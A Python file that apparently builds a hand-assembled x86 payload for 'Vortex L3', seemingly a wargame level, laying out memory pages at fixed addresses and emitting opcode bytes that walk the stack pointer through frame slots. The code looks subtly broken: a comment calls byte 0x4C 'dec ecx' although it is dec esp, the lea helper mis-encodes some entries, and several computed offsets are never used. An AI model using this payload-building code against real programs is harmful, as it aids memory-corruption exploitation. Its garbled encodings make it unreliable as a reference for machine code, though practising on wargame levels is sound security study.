"""Layout of the crossing program used for Vortex L3.

Two image pages:
  0x0804c000  the core: commands run here (write, open, read) and the bounce
              program that drives the copied frame's phase slots
  0x0804d000  a page whose contents are copied 32 bits at a time from the
              mailbox in the frame (mailbox only moves the pointer)
The bounce program ends a phase with the pointer on the slot the next phase
reads as fs/gs/fc; every phase runs one kernel call, so the frame advances
one place each time.
"""
import struct
CORE = 0x0804c000
FRAME_PAGE = 0x0804d000
CHUNK = 0x10


def lea(reg_rm, disp):
    return bytes([0x8D, reg_rm]) + struct.pack("<I", disp & 0xffffffff)


def bounce(mailbox, chunk_writes=5):
    """program at 0x0804d100: copy `chunk_writes` words from the mailbox,
    then walk the frame slots through the phases"""
    ch = CHUNK
    prog = bytearray()
    prog += b"\x8B\xEC"                              # mov ebp, esp
    prog += b"\xB9" + struct.pack("<I", chunk_writes)  # ecx = words left
    prog += b"\xBB" + struct.pack("<I", ch // 2)     # ebx = clamp
    prog += b"\xFC"                                  # cld
    pgA = len(prog)
    prot = [(0x8D, 0x0C)] + [(0x8A, 0x604), (0x8D, 0x604), (0x8A, 0x5FC), (0x8D, 0x5FC)] * 40
    prot += [(0x8B, 0x0C)]                           # move esp back to the copy
    prog += b"".join(lea(a, d) for a, d in prot)
    phA = len(prog)
    prog += bytes([0x4C]) + bytes([0x55, 0xC3]) * (ch // 2 - 1)   # dec ecx ; to the phase
    pgB = len(prog)
    prog += b"\x89\xEB" * (ch // 2)
    phB = len(prog)
    prog += b"\x55\xC3" * (ch // 2)
    pgC = len(prog)
    prog += b"\x89\xEB" * (ch // 2)
    return bytes(prog)
